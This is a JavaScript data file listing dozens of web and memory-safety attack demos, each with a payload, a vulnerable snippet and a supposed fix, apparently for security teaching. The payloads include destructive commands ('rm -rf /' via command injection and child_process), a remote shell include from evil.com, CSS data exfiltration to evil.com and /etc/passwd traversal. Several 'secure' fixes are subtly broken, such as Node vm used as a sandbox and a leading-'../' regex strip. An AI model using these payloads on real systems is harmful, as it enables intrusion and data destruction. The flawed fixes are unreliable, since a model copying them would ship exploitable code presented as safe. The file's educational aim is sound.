export  const hackingDemosJson = [
  {
    id: 1,
    title: "SQL Injection - Basic",
    description: "Basic SQL injection to bypass authentication",
    vulnerability: "Unsanitized user input in database queries",
    attack: "' OR '1'='1' --",
    prevention: "Use parameterized queries and input validation",
    code: `
      // VULNERABLE CODE
      const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
      
      // SECURE CODE
      const query = "SELECT * FROM users WHERE username = ? AND password = ?";
      db.execute(query, [username, password]);
    `,
    impact: "Authentication bypass, data theft"
  },
  {
    id: 2,
    title: "SQL Injection - Data Extraction",
    description: "Extract database information using UNION attacks",
    vulnerability: "Improper input sanitization",
    attack: "' UNION SELECT username, password FROM users --",
    prevention: "Input validation and parameterized queries",
    code: `
      // VULNERABLE
      const query = "SELECT name, email FROM products WHERE id = " + userInput;
      
      // SECURE
      const query = "SELECT name, email FROM products WHERE id = ?";
    `,
    impact: "Complete database disclosure"
  },
  {
    id: 3,
    title: "SQL Injection - Blind",
    description: "Extract data through boolean-based blind injection",
    vulnerability: "No input validation",
    attack: "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --",
    prevention: "Use prepared statements",
    code: `
      // VULNERABLE
      const query = "SELECT * FROM articles WHERE id = " + input;
      
      // SECURE
      const stmt = db.prepare("SELECT * FROM articles WHERE id = ?");
    `,
    impact: "Data extraction through inference"
  },
  {
    id: 4,
    title: "XSS - Stored",
    description: "Persistent XSS attack stored in database",
    vulnerability: "Unescaped user input rendered in HTML",
    attack: "<script>alert('XSS')</script>",
    prevention: "Output encoding and Content Security Policy",
    code: `
      // VULNERABLE
      document.getElementById('comment').innerHTML = userComment;
      
      // SECURE
      document.getElementById('comment').textContent = userComment;
    `,
    impact: "Session hijacking, defacement"
  },
  {
    id: 5,
    title: "XSS - Reflected",
    description: "Non-persistent XSS through URL parameters",
    vulnerability: "Unvalidated URL parameters",
    attack: "http://site.com/search?q=<script>alert(1)</script>",
    prevention: "Input validation and output encoding",
    code: `
      // VULNERABLE
      res.send("<h1>Search results for: " + req.query.q + "</h1>");
      
      // SECURE
      res.send("<h1>Search results for: " + escapeHtml(req.query.q) + "</h1>");
    `,
    impact: "Phishing, credential theft"
  },
  {
    id: 6,
    title: "XSS - DOM Based",
    description: "Client-side XSS without server interaction",
    vulnerability: "Unsafe DOM manipulation",
    attack: "#<img src=x onerror=alert('XSS')>",
    prevention: "Avoid innerHTML, use textContent",
    code: `
      // VULNERABLE
      element.innerHTML = window.location.hash.substring(1);
      
      // SECURE
      element.textContent = window.location.hash.substring(1);
    `,
    impact: "Client-side code execution"
  },
  {
    id: 7,
    title: "CSRF Attack",
    description: "Cross-Site Request Forgery to perform actions on behalf of user",
    vulnerability: "No anti-CSRF tokens",
    attack: `<img src="http://bank.com/transfer?to=attacker&amount=1000">`,
    prevention: "Use CSRF tokens and SameSite cookies",
    code: `
      // VULNERABLE
      app.post('/transfer', (req, res) => {
        // No CSRF protection
      });
      
      // SECURE
      app.post('/transfer', csrfProtection, (req, res) => {
        // Protected endpoint
      });
    `,
    impact: "Unauthorized actions on user's behalf"
  },
  {
    id: 8,
    title: "Command Injection",
    description: "Execute system commands through application",
    vulnerability: "Unsanitized user input in system commands",
    attack: "; rm -rf /",
    prevention: "Input validation and avoid system commands",
    code: `
      // VULNERABLE
      const cmd = 'ping ' + userInput;
      child_process.exec(cmd);
      
      // SECURE
      const args = ['-c', userInput];
      child_process.spawn('ping', args);
    `,
    impact: "Full system compromise"
  },
  {
    id: 9,
    title: "Path Traversal",
    description: "Access files outside web root",
    vulnerability: "Unrestricted file access",
    attack: "../../../etc/passwd",
    prevention: "Path normalization and whitelisting",
    code: `
      // VULNERABLE
      fs.readFile('/var/www/uploads/' + filename);
      
      // SECURE
      const safePath = path.normalize(filename).replace(/^(\.\.[\/\\])+/, '');
      fs.readFile('/var/www/uploads/' + safePath);
    `,
    impact: "Sensitive file disclosure"
  },
  {
    id: 10,
    title: "Local File Inclusion",
    description: "Include local files in PHP applications",
    vulnerability: "Dynamic file inclusion without validation",
    attack: "../../../etc/passwd",
    prevention: "Whitelist allowed files",
    code: `
      // VULNERABLE
      include($_GET['page'] . '.php');
      
      // SECURE
      $allowed = ['home', 'about', 'contact'];
      if (in_array($_GET['page'], $allowed)) {
        include($_GET['page'] . '.php');
      }
    `,
    impact: "Sensitive data exposure, RCE"
  },
  {
    id: 11,
    title: "Remote File Inclusion",
    description: "Include remote files leading to RCE",
    vulnerability: "Unrestricted remote file inclusion",
    attack: "http://evil.com/shell.txt",
    prevention: "Disable allow_url_include",
    code: `
      // VULNERABLE
      include($_GET['file']);
      
      // SECURE
      $allowedFiles = ['local1.php', 'local2.php'];
      if (in_array($_GET['file'], $allowedFiles)) {
        include($_GET['file']);
      }
    `,
    impact: "Remote code execution"
  },
  {
    id: 12,
    title: "SSRF Attack",
    description: "Server-Side Request Forgery to internal resources",
    vulnerability: "Unrestricted server-side requests",
    attack: "http://localhost:22",
    prevention: "Validate and restrict URLs",
    code: `
      // VULNERABLE
      fetch(userProvidedUrl);
      
      // SECURE
      const allowedDomains = ['api.trusted.com'];
      if (allowedDomains.includes(new URL(userProvidedUrl).hostname)) {
        fetch(userProvidedUrl);
      }
    `,
    impact: "Internal network scanning, data theft"
  },
  {
    id: 13,
    title: "XXE Injection",
    description: "XML External Entity processing attack",
    vulnerability: "Unrestricted XML entity processing",
    attack: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    prevention: "Disable external entities",
    code: `
      // VULNERABLE
      const parser = new DOMParser();
      const xml = parser.parseFromString(userXML, 'text/xml');
      
      // SECURE
      libxml_disable_entity_loader(true);
    `,
    impact: "File disclosure, SSRF, DoS"
  },
  {
    id: 14,
    title: "Insecure Deserialization",
    description: "Remote code execution through object deserialization",
    vulnerability: "Unsafe deserialization of user input",
    attack: "Serialized malicious object",
    prevention: "Avoid deserializing user input",
    code: `
      // VULNERABLE
      const obj = JSON.parse(userInput);
      
      // MORE DANGEROUS
      const obj = eval('(' + userInput + ')');
      
      // SECURE
      const obj = JSON.parse(userInput, (key, value) => {
        // Validate structure
      });
    `,
    impact: "Remote code execution"
  },
  {
    id: 15,
    title: "Buffer Overflow",
    description: "Memory corruption through buffer overrun",
    vulnerability: "Unbounded memory copies",
    attack: "A*10000",
    prevention: "Bounds checking, use safe functions",
    code: `
      // VULNERABLE (C code)
      void vulnerable(char *input) {
        char buffer[64];
        strcpy(buffer, input); // No bounds check
      }
      
      // SECURE
      void secure(char *input) {
        char buffer[64];
        strncpy(buffer, input, sizeof(buffer)-1);
        buffer[sizeof(buffer)-1] = '\\0';
      }
    `,
    impact: "Arbitrary code execution"
  },
  {
    id: 16,
    title: "Integer Overflow",
    description: "Memory allocation bypass through integer wrap",
    vulnerability: "Unchecked arithmetic operations",
    attack: "2147483647 + 1",
    prevention: "Input validation and safe math functions",
    code: `
      // VULNERABLE
      int total = size1 + size2; // Can overflow
      buffer = malloc(total);
      
      // SECURE
      if (size1 > SIZE_MAX - size2) {
        // Handle error
      }
      size_t total = size1 + size2;
    `,
    impact: "Buffer overflow, RCE"
  },
  {
    id: 17,
    title: "Format String Attack",
    description: "Memory disclosure through format string bugs",
    vulnerability: "User-controlled format strings",
    attack: "%s%s%s%s%s%s%s",
    prevention: "Never use user input as format string",
    code: `
      // VULNERABLE
      printf(userInput); // User can control format
      
      // SECURE
      printf("%s", userInput); // Fixed format
    `,
    impact: "Memory disclosure, arbitrary write"
  },
  {
    id: 18,
    title: "LDAP Injection",
    description: "LDAP query manipulation",
    vulnerability: "Unsanitized LDAP queries",
    attack: "*)(&",
    prevention: "LDAP query sanitization",
    code: `
      // VULNERABLE
      String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
      
      // SECURE
      String filter = "(&(uid=" + escapeLDAP(username) + ")(userPassword=" + escapeLDAP(password) + "))";
    `,
    impact: "Authentication bypass, data extraction"
  },
  {
    id: 19,
    title: "XPATH Injection",
    description: "XML path language injection",
    vulnerability: "Unsanitized XPATH queries",
    attack: "' or '1'='1",
    prevention: "Input validation, parameterized XPATH",
    code: `
      // VULNERABLE
      String query = "//users/user[username='" + username + "' and password='" + password + "']";
      
      // SECURE
      XPathExpression expr = xpath.compile("//users/user[username=$username and password=$password]");
    `,
    impact: "Authentication bypass, data extraction"
  },
  {
    id: 20,
    title: "Server-Side Template Injection",
    description: "Code execution through template engines",
    vulnerability: "User input in templates",
    attack: "{{7*7}}",
    prevention: "Sandbox templates, avoid user input",
    code: `
      // VULNERABLE
      template.render(userInput, data);
      
      // SECURE
      const safeTemplate = template.compile('Hello {{name}}');
      safeTemplate({name: userInput});
    `,
    impact: "Remote code execution"
  },
  {
    id: 21,
    title: "HTTP Header Injection",
    description: "HTTP response splitting and header injection",
    vulnerability: "Unvalidated CRLF in headers",
    attack: "value\\r\\nHeader: injected",
    prevention: "Validate header values",
    code: `
      // VULNERABLE
      res.setHeader('Location', userInput);
      
      // SECURE
      res.setHeader('Location', userInput.replace(/[\\r\\n]/g, ''));
    `,
    impact: "Cache poisoning, XSS"
  },
  {
    id: 22,
    title: "Open Redirect",
    description: "Phishing through trusted domain redirects",
    vulnerability: "Unvalidated redirect URLs",
    attack: "http://trusted.com/redirect?url=http://evil.com",
    prevention: "Whitelist allowed domains",
    code: `
      // VULNERABLE
      res.redirect(req.query.url);
      
      // SECURE
      const allowed = ['/local', 'https://trusted.com'];
      if (allowed.includes(req.query.url)) {
        res.redirect(req.query.url);
      }
    `,
    impact: "Phishing attacks"
  },
  {
    id: 23,
    title: "Clickjacking",
    description: "UI redress attack hiding malicious actions",
    vulnerability: "Missing frame busting headers",
    attack: "Transparent iframe overlay",
    prevention: "X-Frame-Options and CSP",
    code: `
      // VULNERABLE - No protection
      
      // SECURE
      res.setHeader('X-Frame-Options', 'DENY');
      // OR
      res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
    `,
    impact: "Unauthorized actions"
  },
  {
    id: 24,
    title: "DNS Rebinding",
    description: "Bypass same-origin policy through DNS",
    vulnerability: "Inadequate DNS validation",
    attack: "DNS with short TTL rebinding to internal IP",
    prevention: "Validate Host header, use authentication",
    code: `
      // VULNERABLE
      // No validation of request origin
      
      // SECURE
      app.use((req, res, next) => {
        const allowedHosts = ['mysite.com', 'api.mysite.com'];
        if (!allowedHosts.includes(req.hostname)) {
          return res.status(403).send('Forbidden');
        }
        next();
      });
    `,
    impact: "Internal network access"
  },
  {
    id: 25,
    title: "JWT Token Manipulation",
    description: "JWT algorithm confusion and tampering",
    vulnerability: "Weak JWT verification",
    attack: "Change algorithm to 'none'",
    prevention: "Verify algorithm, use strong secrets",
    code: `
      // VULNERABLE
      jwt.verify(token, secretOrPublicKey, { algorithms: ['HS256', 'none'] });
      
      // SECURE
      jwt.verify(token, secretOrPublicKey, { algorithms: ['HS256'] });
    `,
    impact: "Authentication bypass"
  },
  {
    id: 26,
    title: "Session Fixation",
    description: "Force user to use attacker's session ID",
    vulnerability: "Session ID not regenerated on login",
    attack: "Set user's session ID before login",
    prevention: "Regenerate session on privilege change",
    code: `
      // VULNERABLE
      // Same session before and after login
      
      // SECURE
      app.post('/login', (req, res) => {
        // Authenticate user
        req.session.regenerate(() => {
          req.session.userId = user.id;
        });
      });
    `,
    impact: "Session hijacking"
  },
  {
    id: 27,
    title: "Directory Listing",
    description: "Exposed directory contents",
    vulnerability: "Automatic directory listing enabled",
    attack: "Browse to /uploads/",
    prevention: "Disable directory listing",
    code: `
      // VULNERABLE
      app.use(express.static('public'));
      
      // SECURE
      app.use(express.static('public', { index: false }));
      // OR disable in web server config
    `,
    impact: "Information disclosure"
  },
  {
    id: 28,
    title: "Insecure Direct Object Reference",
    description: "Access unauthorized resources by manipulating IDs",
    vulnerability: "No access control checks",
    attack: "Change ?id=123 to ?id=124",
    prevention: "Access control checks",
    code: `
      // VULNERABLE
      app.get('/file/:id', (req, res) => {
        const file = db.getFile(req.params.id);
        res.send(file);
      });
      
      // SECURE
      app.get('/file/:id', (req, res) => {
        if (!hasAccess(req.user, req.params.id)) {
          return res.status(403).send('Forbidden');
        }
        const file = db.getFile(req.params.id);
        res.send(file);
      });
    `,
    impact: "Unauthorized data access"
  },
  {
    id: 29,
    title: "Race Condition",
    description: "TOCTOU (Time-of-Check-Time-of-Use) vulnerability",
    vulnerability: "Unsafe concurrent operations",
    attack: "Rapid parallel requests",
    prevention: "Atomic operations, locking",
    code: `
      // VULNERABLE
      if (!fs.existsSync(file)) {
        fs.writeFileSync(file, data); // Race condition here
      }
      
      // SECURE
      try {
        fs.writeFileSync(file, data, { flag: 'wx' });
      } catch (err) {
        // File exists
      }
    `,
    impact: "Bypass security checks"
  },
  {
    id: 30,
    title: "Business Logic Abuse",
    description: "Exploit application logic flaws",
    vulnerability: "Poor business logic validation",
    attack: "Negative price, duplicate orders",
    prevention: "Server-side validation",
    code: `
      // VULNERABLE
      if (user.balance >= item.price) {
        user.balance -= item.price; // Client sends negative price
      }
      
      // SECURE
      if (item.price > 0 && user.balance >= item.price) {
        user.balance -= item.price;
      }
    `,
    impact: "Financial loss, data corruption"
  },
  {
    id: 31,
    title: "NoSQL Injection",
    description: "NoSQL database query manipulation",
    vulnerability: "Unsanitized NoSQL queries",
    attack: '{"$where": "this.password == \\"test\\""}',
    prevention: "Input validation, parameterized queries",
    code: `
      // VULNERABLE
      db.users.find({
        username: req.body.username,
        password: req.body.password
      });
      
      // SECURE
      db.users.find({
        username: { $eq: req.body.username },
        password: { $eq: req.body.password }
      });
    `,
    impact: "Authentication bypass, data extraction"
  },
  {
    id: 32,
    title: "Web Cache Poisoning",
    description: "Poison cache with malicious content",
    vulnerability: "Unkeyed input in cache",
    attack: "X-Forwarded-Host: evil.com",
    prevention: "Cache key normalization",
    code: `
      // VULNERABLE
      // Cache key doesn't include all headers
      
      // SECURE
      const cacheKey = generateCacheKey(req.url, req.method, req.headers);
    `,
    impact: "Widespread XSS, defacement"
  },
  {
    id: 33,
    title: "HTTP Request Smuggling",
    description: "Desync attacks through HTTP parsing differences",
    vulnerability: "Differential HTTP parsing",
    attack: "CL.TE or TE.CL smuggling",
    prevention: "Use HTTP/2, normalize requests",
    code: `
      // VULNERABLE
      // Front-end and back-end parse differently
      
      // PREVENTION
      // Disable connection reuse
      // Use HTTP/2
      // Normalize requests
    `,
    impact: "Cache poisoning, credential theft"
  },
  {
    id: 34,
    title: "Prototype Pollution",
    description: "JavaScript prototype manipulation",
    vulnerability: "Unsafe object merging",
    attack: '{"__proto__":{"isAdmin":true}}',
    prevention: "Safe object operations",
    code: `
      // VULNERABLE
      const user = JSON.parse(maliciousInput);
      Object.assign({}, user);
      
      // SECURE
      const user = JSON.parse(maliciousInput);
      const safeUser = {};
      for (const key in user) {
        if (user.hasOwnProperty(key)) {
          safeUser[key] = user[key];
        }
      }
    `,
    impact: "Remote code execution"
  },
  {
    id: 35,
    title: "Zip Slip",
    description: "Path traversal through archive extraction",
    vulnerability: "Unsafe archive extraction",
    attack: "../../../etc/passwd",
    prevention: "Validate extracted paths",
    code: `
      // VULNERABLE
      zipEntry.extractTo(targetDirectory);
      
      // SECURE
      const fullPath = path.join(targetDirectory, zipEntry.name);
      if (!fullPath.startsWith(targetDirectory)) {
        throw new Error('Path traversal attempt');
      }
      zipEntry.extractTo(targetDirectory);
    `,
    impact: "Arbitrary file write"
  },
  {
    id: 36,
    title: "Mass Assignment",
    description: "Set unauthorized properties through bulk assignment",
    vulnerability: "Automatic parameter binding",
    attack: "?role=admin",
    prevention: "Whitelist allowed parameters",
    code: `
      // VULNERABLE
      const user = new User(req.body);
      await user.save();
      
      // SECURE
      const allowed = ['name', 'email'];
      const userData = _.pick(req.body, allowed);
      const user = new User(userData);
      await user.save();
    `,
    impact: "Privilege escalation"
  },
  {
    id: 37,
    title: "CRLF Injection in Logs",
    description: "Log injection through CRLF sequences",
    vulnerability: "Unsanitized log entries",
    attack: "Error\\r\\nINFO: User admin logged in",
    prevention: "Sanitize log input",
    code: `
      // VULNERABLE
      console.log(userInput);
      
      // SECURE
      console.log(userInput.replace(/[\\r\\n]/g, ''));
    `,
    impact: "Log forging, deception"
  },
  {
    id: 38,
    title: "Server-Side JavaScript Injection",
    description: "Code execution through eval-like functions",
    vulnerability: "Unsafe JavaScript execution",
    attack: "require('child_process').exec('rm -rf /')",
    prevention: "Avoid eval, use sandboxes",
    code: `
      // VULNERABLE
      eval(userInput);
      
      // SECURE
      // Use VM sandbox with proper constraints
      const vm = require('vm');
      const context = { console };
      vm.createContext(context);
      vm.runInContext(userInput, context);
    `,
    impact: "Remote code execution"
  },
  {
    id: 39,
    title: "Template Injection - Smarty",
    description: "PHP Smarty template injection",
    vulnerability: "User input in Smarty templates",
    attack: "{php}echo shell_exec('id');{/php}",
    prevention: "Avoid user input in templates",
    code: `
      // VULNERABLE
      $smarty->assign('content', $_GET['template']);
      $smarty->display('template.tpl');
      
      // SECURE
      $allowedTemplates = ['home', 'about'];
      if (in_array($_GET['template'], $allowedTemplates)) {
        $smarty->display($_GET['template'] . '.tpl');
      }
    `,
    impact: "Remote code execution"
  },
  {
    id: 40,
    title: "Header Injection - Host",
    description: "Host header injection for password reset poisoning",
    vulnerability: "Unvalidated Host header",
    attack: "Host: evil.com",
    prevention: "Validate Host header",
    code: `
      // VULNERABLE
      const resetLink = 'https://' + req.headers.host + '/reset?token=' + token;
      
      // SECURE
      const resetLink = 'https://mysite.com/reset?token=' + token;
    `,
    impact: "Password reset poisoning"
  },
  {
    id: 41,
    title: "OAuth Redirect URI Manipulation",
    description: "OAuth flow hijacking through redirect URI",
    vulnerability: "Improper redirect URI validation",
    attack: "redirect_uri=http://evil.com",
    prevention: "Strict redirect URI validation",
    code: `
      // VULNERABLE
      if (redirectUri.startsWith('http://localhost')) {
        res.redirect(redirectUri);
      }
      
      // SECURE
      const allowedUris = ['http://localhost/callback', 'https://mysite.com/auth'];
      if (allowedUris.includes(redirectUri)) {
        res.redirect(redirectUri);
      }
    `,
    impact: "Account takeover"
  },
  {
    id: 42,
    title: "JWT Kid Header Injection",
    description: "Key ID header manipulation in JWT",
    vulnerability: "Unsafe JWT key resolution",
    attack: '{"kid":"../../../../etc/passwd"}',
    prevention: "Validate kid values",
    code: `
      // VULNERABLE
      const key = fs.readFileSync('/keys/' + header.kid);
      
      // SECURE
      const allowedKids = ['key1', 'key2'];
      if (!allowedKids.includes(header.kid)) {
        throw new Error('Invalid key');
      }
    `,
    impact: "Arbitrary file read, signature bypass"
  },
  {
    id: 43,
    title: "GraphQL Injection",
    description: "GraphQL query manipulation and introspection",
    vulnerability: "Unrestricted GraphQL queries",
    attack: "{__schema{types{name}}}",
    prevention: "Query whitelisting, depth limiting",
    code: `
      // VULNERABLE
      app.use('/graphql', graphqlHTTP({
        schema: schema,
        graphiql: true
      }));
      
      // SECURE
      app.use('/graphql', graphqlHTTP({
        schema: schema,
        validationRules: [depthLimit(5)]
      }));
    `,
    impact: "Information disclosure, DoS"
  },
  {
    id: 44,
    title: "Server-Side Request Forgery - Advanced",
    description: "SSRF with protocol handlers",
    vulnerability: "Unrestricted URL fetching",
    attack: "file:///etc/passwd",
    prevention: "URL validation and restriction",
    code: `
      // VULNERABLE
      fetch(userProvidedUrl);
      
      // SECURE
      const url = new URL(userProvidedUrl);
      if (!['http:', 'https:'].includes(url.protocol)) {
        throw new Error('Invalid protocol');
      }
      if (!url.hostname.endsWith('.trusted.com')) {
        throw new Error('Invalid host');
      }
    `,
    impact: "Internal service access, file read"
  },
  {
    id: 45,
    title: "DNS Rebinding - Advanced",
    description: "Advanced DNS rebinding for internal network access",
    vulnerability: "Inadequate origin validation",
    attack: "DNS with multiple A records",
    prevention: "Host header validation, authentication",
    code: `
      // VULNERABLE
      // No origin validation for internal APIs
      
      // SECURE
      app.use('/internal', (req, res, next) => {
        if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') {
          return res.status(403).send('Forbidden');
        }
        next();
      });
    `,
    impact: "Internal service compromise"
  },
  {
    id: 46,
    title: "WebSocket Hijacking",
    description: "Cross-site WebSocket hijacking",
    vulnerability: "No CSRF protection for WebSocket",
    attack: "Malicious page connecting to WebSocket",
    prevention: "Origin validation, CSRF tokens",
    code: `
      // VULNERABLE
      const ws = new WebSocket('ws://site.com/chat');
      
      // SECURE
      wss.on('connection', (ws, req) => {
        const origin = req.headers.origin;
        if (origin !== 'https://mysite.com') {
          ws.close();
          return;
        }
      });
    `,
    impact: "Unauthorized data access"
  },
  {
    id: 47,
    title: "Padding Oracle Attack",
    description: "AES CBC padding oracle attack",
    vulnerability: "Different error messages for padding",
    attack: "Manipulate ciphertext to reveal plaintext",
    prevention: "Use authenticated encryption",
    code: `
      // VULNERABLE
      try {
        const decrypted = decrypt(ciphertext);
      } catch (e) {
        if (e.message === 'Invalid padding') {
          res.status(400).send('Invalid padding');
        } else {
          res.status(500).send('Error');
        }
      }
      
      // SECURE
      try {
        const decrypted = decrypt(ciphertext);
      } catch (e) {
        res.status(400).send('Decryption error');
      }
    `,
    impact: "Data decryption"
  },
  {
    id: 48,
    title: "Type Confusion",
    description: "JavaScript type confusion attack",
    vulnerability: "Inadequate type checking",
    attack: "Unexpected object types",
    prevention: "Strict type checking",
    code: `
      // VULNERABLE
      if (user.isAdmin) {
        // user.isAdmin might be string "false"
      }
      
      // SECURE
      if (user.isAdmin === true) {
        // Strict type checking
      }
    `,
    impact: "Authorization bypass"
  },
  {
    id: 49,
    title: "Regex DoS",
    description: "Regular expression denial of service",
    vulnerability: "Exponential time regex",
    attack: "aaaaaaaaaaaaaaaaaaaa!",
    prevention: "Use safe regex patterns",
    code: `
      // VULNERABLE
      const regex = /^(a+)+$/;
      regex.test('aaaaaaaaaaaaaaaaaaaa!'); // Exponential time
      
      // SECURE
      const regex = /^a+$/; // Linear time
    `,
    impact: "Application denial of service"
  },
  {
    id: 50,
    title: "Memory Exhaustion",
    description: "Memory exhaustion through large inputs",
    vulnerability: "No size limits on inputs",
    attack: "Very large JSON payload",
    prevention: "Input size limits",
    code: `
      // VULNERABLE
      app.use(express.json());
      
      // SECURE
      app.use(express.json({ limit: '1mb' }));
      app.use(express.urlencoded({ limit: '1mb' }));
    `,
    impact: "Denial of service"
  },
  {
    id: 51,
    title: "XML Entity Expansion",
    description: "Billion laughs attack through entity expansion",
    vulnerability: "Unrestricted XML entity expansion",
    attack: "&lol9; with recursive entities",
    prevention: "Disable DTD processing",
    code: `
      // VULNERABLE
      const parser = new DOMParser();
      parser.parseFromString(xml, 'text/xml');
      
      // SECURE
      const parser = new DOMParser();
      // Use libraries that disable DTD
    `,
    impact: "Denial of service"
  },
  {
    id: 52,
    title: "HTTP Parameter Pollution",
    description: "Parameter pollution for logic bypass",
    vulnerability: "Multiple parameter handling",
    attack: "?id=1&id=2",
    prevention: "Use first/last parameter consistently",
    code: `
      // VULNERABLE
      const id = req.query.id; // Could be array
      
      // SECURE
      const id = Array.isArray(req.query.id) ? req.query.id[0] : req.query.id;
    `,
    impact: "Logic bypass, injection"
  },
  {
    id: 53,
    title: "Cookie Tossing",
    description: "Cookie manipulation through subdomains",
    vulnerability: "Overly broad cookie scope",
    attack: "Set cookie for .domain.com",
    prevention: "Restrict cookie scope",
    code: `
      // VULNERABLE
      res.cookie('session', token, { domain: '.example.com' });
      
      // SECURE
      res.cookie('session', token, { domain: 'app.example.com' });
    `,
    impact: "Session fixation, hijacking"
  },
  {
    id: 54,
    title: "CSS Injection",
    description: "CSS injection for data exfiltration",
    vulnerability: "Unsanitized CSS in style attributes",
    attack: "background: url(http://evil.com/steal?data)",
    prevention: "CSS sanitization, CSP",
    code: `
      // VULNERABLE
      element.style = userInput;
      
      // SECURE
      const safeStyles = sanitizeCSS(userInput);
      element.style = safeStyles;
    `,
    impact: "Data exfiltration, UI manipulation"
  },
  {
    id: 55,
    title: "SVG Injection",
    description: "Malicious SVG file upload",
    vulnerability: "Unsafe SVG rendering",
    attack: "<svg onload=alert(1)>",
    prevention: "SVG sanitization",
    code: `
      // VULNERABLE
      <img src="user-uploaded.svg">
      
      // SECURE
      // Sanitize SVG or convert to PNG
      const cleanSVG = DOMPurify.sanitize(userSVG);
    `,
    impact: "XSS, arbitrary script execution"
  },
  {
    id: 56,
    title: "WebRTC IP Leak",
    description: "Internal IP disclosure through WebRTC",
    vulnerability: "Unrestricted WebRTC",
    attack: "STUN requests revealing internal IPs",
    prevention: "WebRTC restrictions",
    code: `
      // VULNERABLE
      const pc = new RTCPeerConnection();
      // Leaks internal IP
      
      // MITIGATION
      // Use VPN or disable WebRTC
    `,
    impact: "Internal network information disclosure"
  },
  {
    id: 57,
    title: "Timing Attack",
    description: "Side-channel timing attack",
    vulnerability: "Different timing for valid/invalid data",
    attack: "Measure response times",
    prevention: "Constant-time comparisons",
    code: `
      // VULNERABLE
      if (password === storedPassword) {
        // Returns early if first characters don't match
      }
      
      // SECURE
      if (crypto.timingSafeEqual(Buffer.from(password), Buffer.from(storedPassword))) {
        // Constant time comparison
      }
    `,
    impact: "Credential guessing"
  },
  {
    id: 58,
    title: "Subdomain Takeover",
    description: "Takeover of abandoned subdomains",
    vulnerability: "Dangling DNS records",
    attack: "Claim abandoned cloud resources",
    prevention: "Monitor DNS records",
    code: `
      // VULNERABLE
      // CNAME record points to deleted cloud service
      
      // PREVENTION
      // Regularly audit DNS records
      // Remove unused records
    `,
    impact: "Phishing, malware hosting"
  },
  {
    id: 59,
    title: "DNS Cache Poisoning",
    description: "DNS spoofing through cache poisoning",
    vulnerability: "Weak DNS transaction IDs",
    attack: "DNS response spoofing",
    prevention: "DNSSEC, random transaction IDs",
    code: `
      // VULNERABLE
      // Predictable DNS transaction IDs
      
      // PREVENTION
      // Use cryptographically secure random IDs
      // Implement DNSSEC
    `,
    impact: "Traffic interception"
  },
  {
    id: 60,
    title: "Mail Header Injection",
    description: "SMTP header injection in email",
    vulnerability: "Unsanitized email headers",
    attack: "\\r\\nBcc: victim@company.com",
    prevention: "Header validation",
    code: `
      // VULNERABLE
      const subject = req.body.subject;
      sendEmail(to, subject, body);
      
      // SECURE
      const subject = req.body.subject.replace(/[\\r\\n]/g, '');
      sendEmail(to, subject, body);
    `,
    impact: "Email spoofing, spam"
  },
  {
    id: 61,
    title: "CSV Injection",
    description: "Formula injection in CSV exports",
    vulnerability: "Unsanitized CSV cell content",
    attack: "=cmd|' /C calc'!A0",
    prevention: "Prefix with tab, sanitize content",
    code: `
      // VULNERABLE
      csv += cell + ',';
      
      // SECURE
      if (cell.startsWith('=') || cell.startsWith('+') || cell.startsWith('-')) {
        csv += "\\t" + cell + ",";
      } else {
        csv += cell + ",";
      }
    `,
    impact: "Arbitrary command execution"
  },
  {
    id: 62,
    title: "XPath Injection - Blind",
    description: "Blind XPath injection for data extraction",
    vulnerability: "Unsanitized XPath queries",
    attack: "' and string-length(//user[1]/password) > 0 or '",
    prevention: "Parameterized XPath",
    code: `
      // VULNERABLE
      String xpath = "//user[username='" + username + "' and password='" + password + "']";
      
      // SECURE
      XPathExpression expr = xpath.compile("//user[username=$username and password=$password]");
    `,
    impact: "Data extraction through inference"
  },
  {
    id: 63,
    title: "IMAP Injection",
    description: "IMAP command injection",
    vulnerability: "Unsanitized IMAP commands",
    attack: ")) OR 1=1 --",
    prevention: "Input validation",
    code: `
      // VULNERABLE
      imap.search(['UNSEEN', 'FROM', userInput], ...);
      
      // SECURE
      imap.search(['UNSEEN', 'FROM', sanitizeImap(userInput)], ...);
    `,
    impact: "Email access, data theft"
  },
  {
    id: 64,
    title: "JSONP Injection",
    description: "JSONP endpoint abuse for XSS",
    vulnerability: "Unsafe JSONP callbacks",
    attack: "callback=alert(1)//",
    prevention: "Validate callback names",
    code: `
      // VULNERABLE
      res.send(callback + '(' + JSON.stringify(data) + ')');
      
      // SECURE
      if (/^[a-zA-Z0-9_]+$/.test(callback)) {
        res.send(callback + '(' + JSON.stringify(data) + ')');
      }
    `,
    impact: "Cross-site scripting"
  },
  {
    id: 65,
    title: "AngularJS Sandbox Escape",
    description: "AngularJS expression sandbox escape",
    vulnerability: "AngularJS sandbox vulnerabilities",
    attack: "{{constructor.constructor('alert(1)')()}}",
    prevention: "Use latest Angular, avoid user expressions",
    code: `
      // VULNERABLE
      <div ng-bind-html="userContent"></div>
      
      // SECURE
      // Use Angular 2+ or sanitize inputs
      $sce.trustAsHtml(sanitizedContent);
    `,
    impact: "Arbitrary JavaScript execution"
  },
  {
    id: 66,
    title: "PHP Object Injection",
    description: "PHP object unserialization RCE",
    vulnerability: "Unsafe unserialize()",
    attack: "O:8:\"stdClass\":1:{s:3:\"cmd\";s:6:\"whoami\";}",
    prevention: "Avoid unserialize on user input",
    code: `
      // VULNERABLE
      $obj = unserialize($_COOKIE['data']);
      
      // SECURE
      $data = json_decode($_COOKIE['data'], true);
    `,
    impact: "Remote code execution"
  },
  {
    id: 67,
    title: "Windows Shortcut Injection",
    description: "Malicious Windows shortcut files",
    vulnerability: "Unsafe shortcut handling",
    attack: "Malicious .lnk file with command",
    prevention: "Scan uploaded files",
    code: `
      // VULNERABLE
      // Allow .lnk file uploads
      
      // SECURE
      $allowed = ['jpg', 'png', 'pdf'];
      $ext = pathinfo($filename, PATHINFO_EXTENSION);
      if (!in_array($ext, $allowed)) {
        throw new Exception('Invalid file type');
      }
    `,
    impact: "Arbitrary command execution"
  },
  {
    id: 68,
    title: "XSLT Injection",
    description: "XSLT stylesheet injection",
    vulnerability: "User-controlled XSLT",
    attack: "<xsl:value-of select=\"system-property('xsl:vendor')\"/>",
    prevention: "Avoid user-controlled XSLT",
    code: `
      // VULNERABLE
      $processor->setParameter('', 'param', $_GET['param']);
      
      // SECURE
